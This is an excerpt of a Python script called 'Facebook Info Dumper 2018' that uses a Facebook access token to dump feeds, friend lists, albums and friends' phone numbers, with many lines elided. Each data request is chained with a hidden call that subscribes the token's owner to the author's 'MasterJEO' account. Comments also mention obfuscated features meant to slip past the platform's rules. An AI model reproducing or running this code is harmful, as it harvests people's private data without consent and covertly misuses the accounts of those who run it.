...
###################################################################
'''
     Facebook Info Dumper 2018 Recoded By: M4st3rJ30
'''
###################################################################
#                             COLOR
...
def baliho():
	try:
		...
		print ' ' + W
		print ('FID 2018').center(44)
		print (W + G +'        Facebook Info Dumper 2018\n          Recoded By: M4st3rJ30'+ W)
		print ' '
####################################################################
#		    Print In terminal
def show_program():
 ...
 ------------------------------------------------------
    ...
    Author     Debby Anggraini
    Name       Facebook Info Dumper 2018
    Recoded    M4st3rJ30
    version    Full Version
    Date       09/18/2018
    Team       Independent
    Facebook   facebook.com/M4st3rJ30
'''%(G,W)
def info_ga():
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/MasterJEO/subscribers?access_token='+token)
		result = json.loads(r.text)
...
# sorry bruda feature is encrypted because it doesn't
# allowed by bot fb owners :)
# for those who can unmarshal, please use it yourself
...
def menu_reaction_ask():
  try:
	...
	cek = raw_input(R + 'M4st3rJ30' + W + '/' + R + 'Bot' + W + '/' + R + 'Reaction' + W + ' >> ')
	...
	if cek in ['1','01']:
		...
		print '[WARNING] Please turn off your VPN before using this feature!!!'
		id()
	elif cek in ['0','00']:
...
def bot():
  try:
	...
	cek = raw_input(R + 'M4st3rJ30' + W +'/' + R +'Bot ' + W + '>> ')
...
def main():
  ...
  try:
	...
	if cek.lower() == 'get_data':
		...
		print '''
[WARNING] You must create access token again if 
...
def search():
	...
	target = raw_input("[!] Friend Name or ID : ")
	...
	for i in a['data']:
	  ...
	  if target in  i['name'] or target in i['id']:
		...
		try:
			...
			pass
		try:
			print '[*] CellPhone No: '+y['mobile_phone']
		except KeyError:
			pass
		try:
			print '[*] Name : '+y['name']
...
def baliho():
	try:
		...
		print ' ' + W
		print ('FID 2018').center(44)
		print (W + '     [' + G +'Facebook Info Dumper 2018 Recoded By: M4st3rJ30'+ W + ']')
		print ' '
####################################################################
#		    Print In terminal
def show_program():
...
def search():
	...
	if target == '':
		print "[!] Friend Name or ID can't be empty !!"
		search()
	else:
		info(target)
